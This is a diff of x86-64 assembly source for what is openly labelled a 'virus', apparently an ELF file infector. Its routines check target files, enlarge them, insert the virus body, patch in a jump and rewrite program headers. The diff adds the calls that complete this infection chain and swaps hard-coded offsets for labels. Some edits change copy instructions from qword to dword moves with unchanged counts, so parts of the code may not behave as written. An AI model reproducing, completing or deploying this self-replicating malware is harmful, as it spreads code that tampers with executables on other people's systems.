@@ -32,7 +32,7 @@ virus:
 	sub    rsp,0x40
 	call   ft_syscall
 	test   eax,eax
-	js     virus+144
+	js     virus_end
 	movsxd rbp,eax
 	mov    rbx,rsp
 	xor    r8d,r8d
@@ -43,21 +43,21 @@ virus:
 	mov    r12d,eax
 	call   ft_syscall
 	cmp    eax,0x3f
-	jle    virus+144
+	jle    virus_end
 	sub    rsp,0x40
 	mov    ecx,0x10
 	mov    rsi,rbx
 	mov    rdi,rsp
-	rep movsq
+	rep    movsd
 	call   check_file
 	mov    rsp,rbx
 	test   eax,eax
-	jne    virus+144
+	jne    virus_end
 	sub    rsp,0x40
 	mov    ecx,0x10
 	mov    rsi,rbx
 	mov    rdi,rsp
-	rep movsq
+	rep    movsd
 	mov    edi,r12d
 	call   writeFile
 	mov    rsp,rbx
@@ -67,6 +67,7 @@ virus:
 	xor    esi,esi
 	mov    rdi,rbp
 	call   ft_syscall
+virus_end:
 	add    rsp,0x40
 	pop    rbx
 	pop    rbp
@@ -251,7 +252,7 @@ increaseFileSize:
 	sub    rsp,0xe0
 	mov    rdi,rsp
 	lea    rsi,[rsp+0x100]
-	rep movsq
+	rep    movsd
 	mov    esi,0x8
 	mov    edi,0x3
 	call   get_section_index
@@ -610,7 +611,7 @@ addJump:
 	xor    edx,edx
 	sub    rsp,0x20
 	mov    QWORD [rsp+0x8],rsi
-	mov    esi,0x74
+	mov    esi,0x74 + 0x61
 	sub    QWORD [rsp+0x8],0x4
 	mov    BYTE [rsp+0x1f],0xe9
 	call   ft_syscall
@@ -630,7 +631,6 @@ addJump:
 	pop    rbx
 	ret
 
-
 insertCode:
 	push   r14
 	mov    r14,rdx
@@ -638,8 +638,10 @@ insertCode:
 	mov    r13,rsi
 	push   r12
 	mov    r12,zeEnd
-	mov	   rsi, signature
-	sub    r12, rsi
+	push   r8
+	mov    r8, signature
+	sub    r12,r8
+	pop    r8
 	push   rbp
 	mov    ebp,edi
 	mov    r12d,r12d
@@ -660,7 +662,7 @@ insertCode:
 	mov    rdi,r13
 	mov    rdx,r12
 	xor    ecx,ecx
-	mov    rsi,_start
+	mov    rsi,signature
 	mov    r8d,0x1
 	call   ft_syscall
 	mov    rsi,QWORD [r14+0x18]
@@ -690,7 +692,7 @@ writeFile:
 	push   rbx
 	sub    rsp,0x58
 	movzx  eax,WORD [rbp+0x4c]
-	rep movsq
+	rep    movsd
 	lea    rsi,[rbp-0x6c]
 	mov    edi,r12d
 	mov    r15,rax
@@ -708,7 +710,7 @@ writeFile:
 	mov    edx,eax
 	mov    eax,0x1
 	dec    edx
-	je     writeFile+414
+	je     return
 	movsxd r13,r12d
 	mov    rsi,QWORD [rbp+0x38]
 	xor    ecx,ecx
@@ -743,7 +745,7 @@ writeFile:
 	lea    rsi,[rbp+0x10]
 	mov    rcx,rbx
 	mov    rdi,rsp
-	rep movsq
+	rep    movsd
 	mov    rdi,QWORD [rbp-0x78]
 	call   get_last_load_segment
 	mov    rdi,rsp
@@ -754,11 +756,11 @@ writeFile:
 	mov    r13,rsi
 	imul   rsi,rsi,0x38
 	add    rsi,rax
-	rep movsq
+	rep    movsd
 	mov    rdi,rsp
 	lea    rsi,[rbp+0x10]
 	mov    rcx,rbx
-	rep movsq
+	rep    movsq
 	mov    rdi,QWORD [rbp-0x80]
 	call   findLastLoadSection
 	add    rsp,0x40
@@ -766,18 +768,45 @@ writeFile:
 	mov    rcx,rbx
 	mov    rdi,rsp
 	mov    r14d,eax
-	rep movsq
+	rep    movsd
 	mov    edi,r12d
 	mov    rsi,QWORD [rbp-0x80]
 	call   increaseFileSize
 	add    rsp,0x40
 	dec    al
-	je     writeFile+412
+	je     return
 	mov    rsi,QWORD [rbp-0x78]
 	mov    ecx,r13d
 	lea    rdx,[rbp+0x10]
+	mov    edi,r12d
+	call   insertCode
+	mov    rsi,QWORD [rbp-0x78]
+	mov    rdi,QWORD [rbp-0x80]
+	mov    r8d,r14d
+	mov    ecx,r13d
+	lea    rdx,[rbp+0x10]
+	call   setHeaders
+	sub    rsp,0x40
+	lea    rsi,[rbp+0x10]
+	mov    rcx,rbx
+	mov    rdi,rsp
+	rep    movsd
+	mov    edi,r12d
+	mov    rdx,QWORD [rbp-0x78]
+	mov    rsi,QWORD [rbp-0x80]
+	call   change_program_header
+	add    rsp,0x40
+return:
+	xor    eax,eax
+	lea    rsp,[rbp-0x28]
+	pop    rbx
+	pop    r12
+	pop    r13
+	pop    r14
+	pop    r15
+	pop    rbp
+	ret
 
 zeEnd:
 	ret
 	
-
